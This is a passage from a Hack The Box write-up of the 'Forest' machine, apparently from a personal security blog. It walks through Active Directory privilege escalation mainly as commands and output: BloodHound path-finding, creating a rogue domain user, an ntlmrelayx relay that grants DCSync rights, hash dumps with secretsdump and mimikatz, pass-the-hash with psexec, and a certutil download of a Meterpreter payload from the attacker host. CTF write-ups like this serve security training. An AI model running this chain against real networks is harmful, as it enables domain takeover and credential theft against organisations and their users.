+</pre></table></code></div></div><p>And now to retrieve the compressed file back to our system.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>PS C:\Users\svc-alfresco\Documents&gt; exit
+C:\Users\svc-alfresco\Documents&gt; exit
+meterpreter &gt; download 20191116084214_BloodHound.zip
+[*] downloading  : 20191116084214_BloodHound.zip. -&gt; /root/Desktop
+[*] downloaded   : 20191116084214_BloodHound.zip. -&gt; /root/Desktop/20191116084214_BloodHound.zip
+</pre></table></code></div></div><p>And now the moment you have been waiting for, witness the capabilities of <code class="language-plaintext highlighter-rouge">BloodHound</code>! There are actually 2 ways to run <code class="language-plaintext highlighter-rouge">BloodHound</code>, first being running it on your own system and secondly being running it in a <code class="language-plaintext highlighter-rouge">Docker</code> container. Since it is extremely troublesome to set up, I will be using this image <a href="https://github.com/belane/docker-bloodhound"><code class="language-plaintext highlighter-rouge">belane/bloodhound</code></a>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>docker run <span class="nt">-it</span> <span class="se">\</span>
+<span class="nt">-p</span> 7474:7474 <span class="se">\</span>
+<span class="nt">-e</span> <span class="nv">DISPLAY</span><span class="o">=</span>unix<span class="nv">$DISPLAY</span> <span class="se">\</span>
+<span class="nt">-v</span> /tmp/.X11-unix:/tmp/.X11-unix <span class="se">\</span>
+<span class="nt">--device</span><span class="o">=</span>/dev/dri:/dev/dri <span class="se">\</span>
+<span class="nt">--name</span> bloodhound belane/bloodhound
+</pre></table></code></div></div><p>What you will notice is that a window will automatically be opened and <code class="language-plaintext highlighter-rouge">BloodHound</code> is instantly ready to be used. Currently, it is not displaying anything as we had yet to upload our data yet. <code class="language-plaintext highlighter-rouge">BloodHound</code> actually supports drag and drop but for some reason it was not working so we need to use <code class="language-plaintext highlighter-rouge">docker cp</code> to get the data in.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>docker <span class="nb">cp </span>20191116084214_BloodHound.zip bloodhound:/20191116084214_BloodHound.zip
+</pre></table></code></div></div><p>Then from the interface, click on <code class="language-plaintext highlighter-rouge">Upload Data</code> on the right side, select the file and hit <code class="language-plaintext highlighter-rouge">Open</code>. It will take a while for <code class="language-plaintext highlighter-rouge">BloodHound</code> to populate its database.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/forest1.png" alt="" /></p><p>I won’t go through all the features of <code class="language-plaintext highlighter-rouge">BloodHound</code>, but I will be focusing on one of them which is the ability to perform pathfinding from a given Start Node to a given Target Node. These nodes can be Users, Groups or OUs. Since we are currently <code class="language-plaintext highlighter-rouge">svc-alfresco</code> and are attempting to escalate to the <code class="language-plaintext highlighter-rouge">Administrator</code> account, we will set <code class="language-plaintext highlighter-rouge">svc-alfresco@htb.local</code> as the Start Node and <code class="language-plaintext highlighter-rouge">Administrator@htb.local</code> as the Target Node and hope that we are able to find a path. Click on the triangle button to begin pathfinding.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/forest2.png" alt="" /></p><p>As you can see, there is indeed a path for us to escalate our privileges. The main focus will be on the edge between <code class="language-plaintext highlighter-rouge">EXCHANGE WINDOWS PERMISSION@HTB.LOCAL</code> and HTB.LOCAL. If you right-click on the edge and click on Help, more information of the <code class="language-plaintext highlighter-rouge">WriteDacl</code> privilege will be given.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL. With write access to the target object's DACL, you can grant yourself any privilege you want on the object.
+</pre></table></code></div></div><p>According to this <a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">post</a>, the <code class="language-plaintext highlighter-rouge">WriteDacl</code> privilege allows us to perform <code class="language-plaintext highlighter-rouge">DCSync</code> operations, which somehow allows us to retrieve hashed passwords from the Active Directory. Hence, we will need to add a user to the <code class="language-plaintext highlighter-rouge">EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL</code>.</p><h1 id="exploitation">Exploitation</h1><p>First we will need to upload <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"><code class="language-plaintext highlighter-rouge">PowerView</code></a>, which is a module that I use that contains many useful <code class="language-plaintext highlighter-rouge">Powershell</code> commands for offensive operations.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>meterpreter &gt; upload /root/Downloads/PowerView.ps1 .
+[*] uploading  : /root/Downloads/PowerView.ps1 -&gt; .
+[*] uploaded   : /root/Downloads/PowerView.ps1 -&gt; .\PowerView.ps1
+</pre></table></code></div></div><p>Back to the powershell shell, we will import it in.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
+</span></pre></table></code></div></div><p>Next we will create a new user and add him to the <code class="language-plaintext highlighter-rouge">EXCHANGE WINDOWS PERMISSIONS</code> group.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nv">$UserPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password123!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="n">New-DomainUser</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">rizemon</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$UserPassword</span><span class="w">
+</span><span class="n">Add-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Exchange Windows Permissions"</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s1">'rizemon'</span><span class="w">
+</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/forest3.png" alt="" /></p><p>According to this picture from the earlier post, we will need to run <code class="language-plaintext highlighter-rouge">ntlmrelayx</code> on our machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>ntlmrelayx.py <span class="nt">-t</span> ldap://htb.local <span class="nt">--escalate-user</span> rizemon
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Protocol Client SMB loaded..
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Protocol Client LDAP loaded..
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Protocol Client LDAPS loaded..
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Protocol Client IMAPS loaded..
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Protocol Client IMAP loaded..
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Protocol Client MSSQL loaded..
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Protocol Client HTTP loaded..
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Protocol Client HTTPS loaded..
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Protocol Client SMTP loaded..
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running <span class="k">in </span>relay mode to single host
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Setting up SMB Server
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Setting up HTTP Server
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Servers started, waiting <span class="k">for </span>connections
+</pre></table></code></div></div><p>With that done, we need to get the <code class="language-plaintext highlighter-rouge">Exchange</code> Server to perform <code class="language-plaintext highlighter-rouge">NTLM</code> authentication to us over <code class="language-plaintext highlighter-rouge">HTTP</code>. However, there is no <code class="language-plaintext highlighter-rouge">Exchange</code> server running on the box! Since we already have a user in the <code class="language-plaintext highlighter-rouge">EXCHANGE WINDOWS PERMISSIONS</code> group, we can simply use our own browser to do the authentication.</p><p>Opening any browser, we browse to <code class="language-plaintext highlighter-rouge">http://localhost/privexchange</code>. We will then be prompted for credentials, where we enter those of our newly created user and hit <code class="language-plaintext highlighter-rouge">OK</code>.</p><p>Back on our <code class="language-plaintext highlighter-rouge">ntlmrelayx</code>, we see that our new user has gotten the necessary privileges to perform <code class="language-plaintext highlighter-rouge">DCSync</code> operations!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="k">*</span><span class="o">]</span> HTTPD: Received connection from 127.0.0.1, attacking target ldap://htb.local
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> HTTPD: Client requested path: /privexchange
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> HTTPD: Client requested path: /privexchange
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating against ldap://htb.local as <span class="se">\r</span>izemon SUCCEED
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerating relayed user<span class="s1">'s privileges. This may take a while on large domains
+[*] User privileges found: Create user
+[*] User privileges found: Modifying domain ACL
+[*] Querying domain security descriptor
+[*] Success! User rizemon now has Replication-Get-Changes-All privileges on the domain
+[*] Try using DCSync with secretsdump.py and this user :)
+[*] Saved restore state to aclpwn-20191229-070933.restore
+</span></pre></table></code></div></div><p>And now the last step is to obtain the hash for the domain administrator account using <code class="language-plaintext highlighter-rouge">impacket</code>’s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py"><code class="language-plaintext highlighter-rouge">secretsdump.py</code></a>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python secretsdump.py <span class="s1">'htb.local/rizemon:Password123!@htb.local'</span> <span class="nt">-just-dc</span>
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+...
+</pre></table></code></div></div><h1 id="roottxt-1">root.txt (1)</h1><p>Using <code class="language-plaintext highlighter-rouge">impacket</code>’s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py"><code class="language-plaintext highlighter-rouge">psexec.py</code></a> and the hashes we got, we can remotely login to the box as Administrator.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>psexec.py Administrator@htb.local <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on htb.local.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file NKMskQmQ.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on htb.local.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service IHWO on htb.local.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service IHWO.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.14393]
+<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;more C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+f048XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></table></code></div></div><h1 id="roottxt2">root.txt(2)</h1><p>First we will need to upload <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"><code class="language-plaintext highlighter-rouge">PowerView</code></a>, which contains the commands needed for our exploit.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>meterpreter &gt; upload /root/Downloads/PowerView.ps1 .
+[*] uploading  : /root/Downloads/PowerView.ps1 -&gt; .
+[*] uploaded   : /root/Downloads/PowerView.ps1 -&gt; .\PowerView.ps1
+</pre></table></code></div></div><p>Back to the powershell shell, we will import it in.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
+</span></pre></table></code></div></div><p>Next we will create a new user and add him to the <code class="language-plaintext highlighter-rouge">EXCHANGE WINDOWS PERMISSIONS</code> group.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nv">$UserPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password123!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="n">New-DomainUser</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">rizemon</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$UserPassword</span><span class="w">
+</span><span class="n">Add-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Exchange Windows Permissions"</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s1">'rizemon'</span><span class="w">
+</span></pre></table></code></div></div><p>With that done, we will need to login as the newly created user. To do so, we will need to allow the user to be remotely managed by adding him to the <code class="language-plaintext highlighter-rouge">Remote Management Users</code> group.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">Add-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Remote Management Users"</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s1">'rizemon'</span><span class="w">
+</span></pre></table></code></div></div><p>We then establish a shell using <code class="language-plaintext highlighter-rouge">Alamot</code>’s <a href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb"><code class="language-plaintext highlighter-rouge">winrm_shell.rb</code></a> and upgrade to a <code class="language-plaintext highlighter-rouge">meterpreter</code> shell.</p><div class="language-ruby highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="nb">require</span> <span class="s1">'winrm'</span>
+
+<span class="c1"># Author: Alamot</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span> 
+  <span class="ss">endpoint: </span><span class="s1">'http://htb.local:5985/wsman'</span><span class="p">,</span>
+  <span class="ss">transport: :ssl</span><span class="p">,</span>
+  <span class="ss">user: </span><span class="s1">'htb.local\rizemon'</span><span class="p">,</span>
+  <span class="ss">password: </span><span class="s1">'Password123!'</span><span class="p">,</span>
+  <span class="ss">:no_ssl_peer_verification</span> <span class="o">=&gt;</span> <span class="kp">true</span>
+<span class="p">)</span>
+<span class="o">...</span>
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>ruby winrm_shell.rb
+PS htb<span class="se">\r</span>izemon@FOREST Documents&gt; certutil <span class="nt">-f</span> <span class="nt">-split</span> <span class="nt">-urlcache</span> http://10.10.XX.XX/shell.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+  000000  ...
+  01204a
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+
+PS htb<span class="se">\r</span>izemon@FOREST Documents&gt;./shell.exe
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>[*] Sending stage (179779 bytes) to 10.10.10.161
+[*] Meterpreter session 1 opened (10.10.XX.XX:1337 -&gt; 10.10.10.161:50337) at 2019-11-16 11:22:12 -0500
+
+meterpreter &gt;
+</pre></table></code></div></div><p>We are going to need <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"><code class="language-plaintext highlighter-rouge">PowerView</code></a> again as well as <a href="https://github.com/gentilkiwi/mimikatz/releases"><code class="language-plaintext highlighter-rouge">mimikatz</code></a>, which is used to dump out the password hashes.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>meterpreter &gt; upload /root/Downloads/PowerView.ps1 .
+[*] uploading  : /root/Downloads/PowerView.ps1 -&gt; .
+[*] uploaded   : /root/Downloads/PowerView.ps1 -&gt; .\PowerView.ps1
+meterpreter &gt; upload /root/Downloads/mimikatz.exe .
+[*] uploading  : /root/Downloads/mimikatz.exe -&gt; .
+[*] uploaded   : /root/Downloads/mimikatz.exe -&gt; .\mimikatz.exe
+</pre></table></code></div></div><p>To dump out the hashes, the new user will need the <code class="language-plaintext highlighter-rouge">DCSync</code> privileges, which consist of the <code class="language-plaintext highlighter-rouge">DS-Replication-Get-Changes</code>, <code class="language-plaintext highlighter-rouge">DS-Replication-Get-Changes-All</code> and <code class="language-plaintext highlighter-rouge">Replicating Directory Changes In Filtered Set</code> rights. More can be learnt from <a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync">here</a>. Fortunately, we can use the <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl</code> function to add all 3 privilges for us using the <code class="language-plaintext highlighter-rouge">-Rights DCSync</code> option.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="n">meterpreter</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">shell</span><span class="w">
+</span><span class="kr">Process</span><span class="w"> </span><span class="mi">1224</span><span class="w"> </span><span class="n">created.</span><span class="w">
+</span><span class="nx">Channel</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nx">created.</span><span class="w">
+</span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="p">[</span><span class="n">Version</span><span class="w"> </span><span class="mf">10.0</span><span class="o">.</span><span class="nf">14393</span><span class="p">]</span><span class="w">
+</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2016</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">
+
+</span><span class="n">C:\Users\rizemon\Documents</span><span class="err">&gt;</span><span class="nx">powershell</span><span class="w">
+</span><span class="n">powershell</span><span class="w">
+</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w"> 
+</span><span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">C</span><span class="p">)</span><span class="w"> </span><span class="mi">2016</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\peter1\Documents</span><span class="err">&gt;</span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">/PowerView.ps1</span><span class="w">
+</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">/PowerView.ps1</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\peter1\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Add-ObjectACL</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">rizemon</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">DCSync</span><span class="w">
+</span><span class="n">Add-ObjectACL</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">rizemon</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">DCSync</span><span class="w">
+</span></pre></table></code></div></div><p>And finally, we dump out the hashes.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre>PS C:\Users\rizemon\Documents&gt; ./mimikatz.exe
+./mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Nov 25 2019 02:50:28
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # lsadump::dcsync /domain:htb.local /user:Administrator
+[DC] 'htb.local' will be the domain
+[DC] 'FOREST.htb.local' will be the DC server
+[DC] 'Administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+User Principal Name  : Administrator@htb.local
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000200 ( NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 9/18/2019 9:09:08 AM
+Object Security ID   : S-1-5-21-3072663084-364016917-1341370565-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 32693b11e6aa90eb43d32c72a07ceea6
+</pre></table></code></div></div><p>Using <code class="language-plaintext highlighter-rouge">impacket</code>’s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py"><code class="language-plaintext highlighter-rouge">psexec.py</code></a> and the hash we got, we can remotely login to the box as Administrator.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>psexec.py Administrator@htb.local <span class="nt">-hashes</span> :32693b11e6aa90eb43d32c72a07ceea6
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on htb.local.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file NKMskQmQ.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on htb.local.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service IHWO on htb.local.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service IHWO.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.14393]
+<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;more C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+f048XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ldap/" class="post-tag no-text-decoration" >ldap</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >kerberos</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Forest - rizemon's blog&url=https://rizemon.github.io/posts/forest-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Forest - rizemon's blog&u=https://rizemon.github.io/posts/forest-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Forest - rizemon's blog&url=https://rizemon.github.io/posts/forest-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div 